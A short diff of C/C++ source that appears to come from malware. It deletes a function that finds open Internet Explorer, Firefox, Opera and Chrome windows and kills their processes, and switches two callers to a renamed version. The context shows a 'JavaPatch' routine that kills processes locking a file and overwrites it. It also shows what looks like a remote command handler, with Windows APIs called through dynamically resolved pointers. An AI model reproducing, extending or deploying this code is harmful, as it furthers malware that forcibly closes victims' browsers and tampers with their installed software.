@@ -726,24 +726,6 @@ static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
 	return procCount;
 }
 
-void KillAllBrowser()
-{
-	const char* browsers[] = { "IEFrame", "MozillaWindowClass", "OperaWindowClass", "Chrome_WidgetWin_0", 0 };
-	const char** bb = browsers;
-	while( *bb )
-	{
-		HWND wnd = (HWND) pFindWindowA( *bb, 0 );
-		if( wnd )
-		{
-			DWORD PID = 0;
-			pGetWindowThreadProcessId( wnd, &PID );
-			if( PID )
-				if( KillProcess(PID, 1000) )
-					DBG( "JavaPatcher", "kill browser %s", *bb );
-		}
-		bb++;
-	}
-}
 
 ///////////////////////////////////////////////////////////////////////////////
 HHOOK hMsgBoxHook;
@@ -1002,7 +984,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				PIDS = 0;
 			};	
 					
-			KillAllBrowser();
+			KillAllBrowsers();
 
 			if( pCopyFileA( srcFile, dstFile, FALSE ) ) 
 			{
@@ -1106,7 +1088,7 @@ bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 
 	if( !GetJavaVersion() ) return false;
 
-	KillAllBrowser();
+	KillAllBrowsers();
 	pSleep(5000);
 
 	char path[MAX_PATH];
